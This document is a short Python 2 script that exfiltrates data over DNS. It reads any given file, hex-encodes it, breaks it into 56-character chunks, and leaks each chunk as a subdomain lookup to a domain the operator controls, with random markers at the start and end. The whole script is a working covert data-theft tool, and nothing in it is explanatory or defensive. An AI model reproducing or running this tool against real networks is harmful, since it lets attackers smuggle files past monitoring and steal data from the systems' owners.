#!/usr/bin/python
#
import sys
import random
import string
import socket

maxlength = 56

def hex_to_ascii(input):
    return input.decode('hex')

def ascii_to_hex(input):
    return input.encode('hex')

def readfile(infile):
    f = open(infile,"r")
    return f.read()

def sendtodomain(domain):
    print "\t[*] Requesting " + domain
    socket.gethostbyname(domain)

def randomword(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

if __name__ == '__main__':
    infile = sys.argv[1]
    sndto = sys.argv[2]
    print "[*] Starting to send file (" + infile + ") via DNS channel, using " + sndto + " as TLD"

    fcontent = ascii_to_hex(readfile(infile))
    print "\t[*] Encoded content length is " + str(len(fcontent))

    startendstr = randomword(20)

    print "\t[*] Marking the start of transmission with '" + startendstr + "'."
    sendtodomain(startendstr + "." + sndto)

    x = 0
    data=""
    for i in range(len(fcontent)):
        x+=1
        data += fcontent[i]
        if x == maxlength:
            print "Sending data: " + data + "." + sndto
            domain = data + "." + sndto
            sendtodomain(domain)
            data = ""
            x=0
    if data != "":
        domain = data + "." + sndto
        sendtodomain(domain)

    print "\t[*] Marking the end of transmission with '" + startendstr + "'."
    sendtodomain(startendstr + "." + sndto)

    print "[*] All done!"

